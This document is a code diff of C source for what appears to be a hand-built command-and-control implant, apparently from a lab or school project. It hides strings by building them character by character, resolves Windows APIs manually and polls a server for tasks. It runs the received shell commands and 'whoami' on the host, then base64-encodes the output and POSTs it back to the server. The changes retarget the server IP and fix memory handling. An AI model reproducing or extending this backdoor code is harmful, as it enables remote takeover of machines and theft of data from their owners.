@@ -365,13 +365,13 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize)
     WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
 
     // Home
-    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
+    //WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
 
     // School
     //WCHAR wServer[] = { '1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0 };
 
     // Host-Only
-    // WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
+     WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
 
     WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
     WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
@@ -766,14 +766,7 @@ CHAR* myEndTrim(CHAR* str, CHAR trim)
     return str;
 }
 
-CHAR* myTrim(CHAR* str, CHAR trim)
-{
-    CHAR* outStr = myStartTrim(str, trim);
-    outStr = myEndTrim(outStr, trim);
-    return outStr;
-}
-
-CHAR* myTrimB(PAPI api, CHAR* str, CHAR trim)
+CHAR* myTrim(CCHAR* str, CHAR trim)
 {
     CHAR* outStr = myStartTrim(str, trim);
     outStr = myEndTrim(outStr, trim);
@@ -964,7 +957,8 @@ void myMain()
     PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll, whoami_c);
     ((PRINTF)api->printf)("\np Whoami: %p\n",PEsgStdApi->Whoami);
 
-    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
+    //WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
+    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
     WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
     WCHAR uuid[] = { '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0 };
     WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
@@ -990,6 +984,13 @@ void myMain()
     };
     DWORD totalJsonSize;
     CHAR* json;
+    WCHAR fullPath2[] =
+    {
+        '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
+        't', '/','1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-',
+        '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f',
+        'a', '2', 'f', '0', 'd', '0', 0
+    };
 
     while (TRUE)
     {
@@ -1025,7 +1026,8 @@ void myMain()
                 NULL,
                 NULL
         );
-        task = (CHAR*)((CALLOC)api->calloc)(taskSize, sizeof(CHAR));
+        ((PRINTF)api->printf)("\ntaskSize1: %d", taskSize);
+        task = (CHAR*)((CALLOC)api->calloc)(taskSize+1, sizeof(CHAR));
 
         ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
         (
@@ -1037,18 +1039,22 @@ void myMain()
                 NULL,
                 NULL
         );
+        ((PRINTF)api->printf)("\ntaskSize2: %d", taskSize);
+
         ((PRINTF)api->printf)("\np task: %p", task);
         ((PRINTF)api->printf)("\ntask: %s", task);
+        ((PRINTF)api->printf)("\nmyStrlenA(task): %d", myStrlenA(task));
 
         if (my_strcmp(taskType, "cmd") == 0)
         {
-            taskOutput = myTrimB(api, ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
+            CHAR* tmpOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
+            taskOutput = myTrim(tmpOutput, '\n');
+            if (tmpOutput)
+            { ((FREE)api->free)(tmpOutput); }
         }
         else if (my_strcmp(taskType, "whoami") == 0)
         {
-            ((PRINTF)api->printf)("\nho\n");
-            taskOutput = myTrimB(api, ((WHOAMI)PEsgStdApi->Whoami)(), '\n');
-            ((PRINTF)api->printf)("\nyo\n");
+            taskOutput = myTrim(((WHOAMI)PEsgStdApi->Whoami)(), '\n');
             ((PRINTF)api->printf)("\ntaskOutput: \n%s\n", taskOutput);
         }
         else
@@ -1057,30 +1063,24 @@ void myMain()
             ((PRINTF)api->printf)("unknown task type, you f'ed up, this should never happen");
         }
 
-
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
         b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
 
-        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid);
+        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
         json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
-        WCHAR fullPath2[] =
-        {
-            '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
-            't', '/','1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-',
-            '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f',
-            'a', '2', 'f', '0', 'd', '0', 0
-        };
         ((PRINTF)api->printf)("\ntotalJsonSize: %d\n", totalJsonSize);
         ((PRINTF)api->printf)("\nmyStrlenA(json): %d\n", myStrlenA(json));
         ((PRINTF)api->printf)("\njson: %s\n", json);
         PostRequest(api, wServer, port, fullPath2, json);
 
+        /*
         if (taskOutput)
         {
             ((FREE)api->free)(taskOutput);
         }
+        */
         if (b64EncodedOutput)
         {
             ((FREE)api->free)(b64EncodedOutput);
